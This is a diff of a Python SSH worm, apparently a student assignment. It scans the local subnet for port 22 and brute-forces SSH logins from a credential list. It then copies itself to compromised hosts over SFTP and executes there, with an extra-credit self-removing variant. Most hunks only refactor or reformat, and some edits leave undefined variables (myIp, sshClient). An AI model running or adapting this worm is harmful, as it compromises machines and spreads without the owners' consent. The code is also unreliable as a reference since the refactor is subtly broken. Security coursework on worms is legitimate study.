@@ -15,6 +15,8 @@ credList = [
 
 # The fileing whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
+
+
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
@@ -28,6 +30,7 @@ def isInfectedSystem():
     is_infected = os.path.isfile("/tmp/infected.txt")
     return is_infected
 
+
 #################################################################
 # Marks the system as infected
 #################################################################
@@ -38,14 +41,14 @@ def markInfected():
     infected_file = open("/tmp/infected.txt", "w+")
     infected_file.close()
 
+
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
-	
-	# This function takes as a parameter 
+	# This function takes as a parameter
 	# an instance of the SSH class which
 	# was properly initialized and connected
 	# to the victim system. The worm will
@@ -60,7 +63,6 @@ def spreadAndExecute(sshClient):
 	sftpClient.close()
 	sshClient.exec_command("chmod a+rwx /tmp/worm.py")
 	sshClient.exec_command("python /tmp/worm.py")
-
 
 
 ############################################################
@@ -105,6 +107,7 @@ def tryCredentials(host, userName, password, sshClient):
 		return 1
 	pass
 
+
 ###############################################################
 # Wages a dictionary attack against the host
 # @param host - the host to attack
@@ -143,6 +146,7 @@ def attackSystem(host):
 	# Could not find working credentials
 	return None	
 
+
 ####################################################
 # Returns the IP of the current system
 # @param interface - the interface whose IP we would
@@ -154,6 +158,7 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	my_ip = netinfo.get_ip(interface)
 	return my_ip
+
 
 #######################################################
 # Returns the list of systems on the same network
@@ -171,9 +176,22 @@ def getHostsOnTheSameNetwork():
 	for i in interface_list:
 		if i == "enp0s3":
 			interface = i 
-	x = portScanner.scan(getMyIP(interface) + "/24",  arguments='-p 22 --open')
+	portScanner.scan(getMyIP(interface) + "/24",  arguments='-p 22 --open')
 	hostInfo = portScanner.all_hosts()
 	return hostInfo
+
+
+def removeSelfFromIpList(networkHosts):
+	for host in networkHosts:
+		if host == myIp:
+			networkHosts.remove(host)
+
+
+def sftpGetOrThrowException(sshClient):
+	remotePath = '/tmp/infected.txt'
+	localPath = '/home/infectCheck.txt'
+	sftpClient = sshClient.open_sftp()
+	sftpClient.get(remotePath, localPath)
 
 #!!!!!!!!!!!!!!extra credit!!!!!!!!!!!!!!!!!!!!!!!!!!!
 def spreadAndRemove():
@@ -181,39 +199,28 @@ def spreadAndRemove():
 	networkHosts = getHostsOnTheSameNetwork()
 	print 'found hosts: '
 	print networkHosts
-	interface_list = netinfo.list_devs()[0]
-	interface = None
-	print interface_list
-	for i in interface_list:
-		if i == "enp0s3":
-			interface = i  
 	myIp = getMyIP("enp0s3")
 	if networkHosts is not None:
-		for host in networkHosts:			
-			if host == myIp:
-				networkHosts.remove(host)
-		for host in networkHosts:	
+		removeSelfFromIpList(networkHosts)
+		for host in networkHosts:
 			sshInfo = attackSystem(host)
 			print sshInfo
 			if sshInfo:
 				print 'trying to spread'
 				try:
-					remotepath = '/tmp/infected.txt'
-					localpath = '/home/infectCheck.txt'
 					sftpClient = sshInfo[0].open_sftp()
-					sshClient = sshInfo[0]
-					sftpClient.get(remotepath, localpath)
-					sftpClient = sshClient.open_sftp()
+					sftpGetOrThrowException(sshInfo[0])
 					sftpClient.put("worm.py", "/tmp/worm.py")
-					sftpClient.close()
 					sshClient.exec_command("chmod a+rwx /tmp/worm.py")
 					sshClient.exec_command("rm /tmp/infected.txt")
 					sshClient.exec_command("python /tmp/worm.py r")
 					sshClient.exec_command("rm /tmp/worm.py")
+					sftpClient.close()
 				except Exception as e:
 					print e	
 					print 'System not infected'
 #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -240,7 +247,7 @@ else:
 		# TODO: If we are running on the victim, check if 
 		# the victim was already infected. If so, terminate.
 		# Otherwise, proceed with malice.
-	if (isInfectedSystem()):
+	if isInfectedSystem():
 		print "System already infected"		
 		exit()
 if not origin_mode:
@@ -257,16 +264,14 @@ networkHosts = getHostsOnTheSameNetwork()
 # do not want to target ourselves!).
 
 if networkHosts is not None:
-	for host in networkHosts:
-		if host == myIp:
-			networkHosts.remove(host)
+	removeSelfFromIpList(networkHosts)
 	print "Found hosts: ", networkHosts
 
 	# Go through the network hosts
 	for host in networkHosts:
 
-	# Try to attack this host
-		sshInfo =  attackSystem(host)
+		# Try to attack this host
+		sshInfo = attackSystem(host)
 		print sshInfo
 
 		# Did the attack succeed?
@@ -281,17 +286,14 @@ if networkHosts is not None:
 			# This can be done using code similar to
 			# the code below:
 			try:
-				remotepath = '/tmp/infected.txt'
-				localpath = '/home/infectCheck.txt'
-			#	 # Copy the file from the specified
-			#	 # remote path to the specified
-			# 	 # local path. If the file does exist
-			#	 # at the remote path, then get()
-			# 	 # will throw IOError exception
-			# 	 # (that is, we know the system is
-			# 	 # not yet infected).
-				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.get(remotepath, localpath)
+				# Copy the file from the specified
+				# remote path to the specified
+				# local path. If the file does exist
+				# at the remote path, then get()
+				# will throw IOError exception
+				# (that is, we know the system is
+				# not yet infected).
+				sftpGetOrThrowException(sshInfo[0])
 			except IOError:
 				print "This system should be infected"
 				spreadAndExecute(sshInfo[0])
